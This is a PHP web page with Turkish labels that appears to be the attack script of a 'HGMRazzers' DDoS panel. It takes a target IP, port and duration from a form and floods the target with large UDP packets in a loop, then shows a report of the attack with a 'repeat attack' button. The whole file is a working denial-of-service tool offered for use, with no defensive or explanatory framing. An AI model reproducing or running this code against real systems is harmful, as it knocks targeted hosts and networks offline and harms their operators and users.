<style>
body {
	font-family: calibri,tahoma,verdana,terminal,serif,lucida,system;
	font-size: 12px;
	font-style: normal;
	line-height: normal;
	color: #7CFC00;
	background-color: #000000;
}

.HGMRazzers_Buton {
width: 240px;
border: solid 2px #00BCFF;
background-color: #000000;
padding: 3px;
cursor: pointer }

input:hover , input:active { border-color: #FF0000 }

</style>
<center><br><br>
<img src="HGMRbackground.PNG"><br>
<?php

//=================================================
//Coded by HGMRazzers By HGM
//=================================================

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "Xqw8N7*~mldQ~dnG6QBwAA-9Unq?,vGaN9+gPL6h^YHTWGjMal+_*8ym&gO9yxx8:_&sFh-/*-VD@$";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "<b><font size=3>|-------------------------------------------------------------------------|</font></b>";
echo "<b><font size=3><br>Tamamlanan</font><font color=red><font size=3> Saldiri</font><font color=#7CFC00><font size=3> Bilgileri;</font></b><br>";
echo "<b><font size=3>|-------------------------------------------------------------------------|</font></b>";
echo "<b><font size=2><br>Saldirilan Ip:<font color=red> $ip</font></b><br>";
echo "<b><font size=2>Saldirilan Port:<font color=red> $rand </font></b><br>";
echo "<b><font size=2>Saldiri Suresi:<font color=red> $exec_time </font><font color=red>Saniye</font></b><br>";
echo "<b><font size=2>Paket Bilgisi:<font color=red> $packets Paket </font></b><br>";
echo "<b><font size=2>Paket Boyutu:<font color=red> (" . round(($packets*65)/1024, 2) . " Mb)</font></b><br>";
echo "<b><font size=2>Paketlerin Ortalamasi:<font color=red> ". round($packets/$exec_time, 2) . " Paket // Saniye \n </font></b><br>";
echo "<b><font size=3>|-------------------------------------------------------------------------|</font></b>";
?>
<br><br>
<input type="button" value="Saldiriyi Tekrarla -->" class="HGMRazzers_Buton" style="color:red" onclick="parent.window.location.reload();" /> <br><br></td>
<input type="button" value="<-- Geri Donme" class="HGMRazzers_Buton" style="color:#7CFC00" onclick="window.location.href='/HGMRazzers/HGMRazzers-DDoS-Panel.php'" /> </td>